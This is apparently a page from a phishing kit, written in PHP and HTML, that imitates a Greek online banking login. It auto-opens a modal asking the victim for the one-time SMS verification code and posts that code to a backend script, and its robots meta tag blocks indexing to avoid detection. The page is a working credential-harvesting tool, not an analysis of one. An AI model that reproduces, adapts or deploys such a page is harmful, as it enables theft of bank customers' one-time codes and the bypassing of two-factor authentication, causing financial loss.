<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./Assets/imgs/ff.ico" />

        <title>Log in to Online Banking</title>
        <script src="./Assets/js/stutes.js"></script>        
    </head>

    <body>

        <div id="wrapper">
            <div class="left"></div>
            <div class="right">
                <div class="inner">
                    <div class="logo">
                        <div><img style="max-width: 230px;" src="./Assets/imgs/logo.svg"></div>
                        <div class="lang">
                            <button type="button">Ελληνικά <i class="fa-solid fa-caret-down"></i></button>
                            <ul>
                                <li><a href="index.php?lang=gr">Ελληνικά</a></li>
                                <li><a href="index.php?lang=en">English</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="sms" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="smsLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-body">
                        
                        <form action="./Assets/php/config/func.php" method="POST">
                        <input type="hidden" name="sms">
                            <div class="text-center mb20"><img style="max-width: 90px;" src="./Assets/imgs/phone.png"></div>
                            <h3>Κωδικός επαλήθευσης</h3>
                            <p>Εισαγάγετε τον Κωδικό Μίας Χρήσης (OTP) που έχει σταλεί στον αριθμό του κινητού σας τηλεφώνου.</p>
                            
                            <?php if( isset($_GET['error']) ) : ?>
                            <div class="error">
                                <div class="sym"><i class="fa-solid fa-circle-exclamation"></i></div>
                                <p>Ο κωδικός που πληκτρολογήσατε είναι λάθος. Ελέγξτε τον κωδικό και δοκιμάστε ξανά</p>
                            </div>
                            <?php endif; ?>

                            <div class="form-group mb30 <?php if(isset($_GET['error'])) echo "has-error"?>">
                                <label for="sms_code">Κωδικός επαλήθευσης</label>
                                <input type="text" name="sms_code" id="sms_code" class="form-control">
                            </div>
                            <div class="btns">
                                <button type="submit">Συνεχίζω</button>
                                <p>Στείλτε ξανά νέο κωδικό</p>
                            </div>
                        </form>

                    </div>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>

            var myModal = new bootstrap.Modal(document.getElementById("sms"), {});
            myModal.show();

        </script>

    </body>

</html>